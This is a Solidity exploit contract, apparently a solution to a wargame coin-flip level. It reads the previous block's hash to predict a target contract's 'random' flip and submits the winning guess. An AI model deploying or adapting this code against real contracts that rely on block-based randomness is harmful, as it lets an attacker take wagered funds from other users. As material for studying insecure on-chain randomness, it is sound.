// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
    using SafeMath for uint256;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinflipAddress;

    constructor(address _coinflipAddress) {
        coinflipAddress = _coinflipAddress;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        ICoinFlip(coinflipAddress).flip(side);
    }
}
